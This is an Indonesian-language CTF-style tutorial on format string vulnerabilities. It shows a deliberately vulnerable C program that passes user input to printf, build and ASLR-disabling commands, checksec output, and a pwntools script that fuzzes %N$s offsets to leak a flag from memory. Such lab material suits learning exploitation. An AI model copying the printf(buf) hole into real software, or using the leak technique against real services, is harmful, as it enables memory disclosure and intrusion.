[x] NO Canary ~ -fno-stack-protector
[x] PIE ~ tanpa -no-pie
[x] NX ~ tanpa -z execstack
[x] NO ASLR ~ echo 0 > /proc/sys/kernel/randomize_va_space

vuln_program.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[64];
  char flag[64];
  char *flag_ptr = flag;
  
  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("We will evaluate any format string you give us with printf().");
  
  FILE *file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("flag.txt is missing!\n");
    exit(0);
  }
  
  fgets(flag, sizeof(flag), file);
  
  while(1) {
    printf("> ");
    fgets(buf, sizeof(buf), stdin);
    printf(buf);
  }  
  return 0;
}
```

kita kompile dengan cara seperti ini 

```bash
gcc -g -m32 -fstack-protector -o vuln32 vuln_program.c
```

setting disable untuk perlindungan ASLR pada sistem operasi linux

```bash
echo 0 > /proc/sys/kernel/randomize_va_space
```

kemudian lakukan checksec

```bash
$checksec vuln32
Arch:     i386-32-little    
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

untuk membaca isi dari alamat memori bisa dengan melakukan brute force alamat dari 1 sampai 100

referensi yang menjelaskan 
https://vickieli.dev/binary%20exploitation/format-string-vulnerabilities/

untuk menampilkan isi dari alamat memory

```python
from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./jajal', checksec=False)

# Let's fuzz 100 values
for i in range(100):
    try:
        # Create process (level used to reduce noise)
        p = process(level='error')
        # When we see the user prompt '>', format the counter
        # e.g. %2$s will attempt to print second pointer as string
        p.sendlineafter(b'> ', '%{}$s'.format(i).encode())
        # Receive the response
        result = p.recvuntil(b'> ')
        # Check for flag
        # if("flag" in str(result).lower()):
        print(str(i) + ': ' + str(result))
        # Exit the process
        p.close()
    except EOFError:
        pass
```

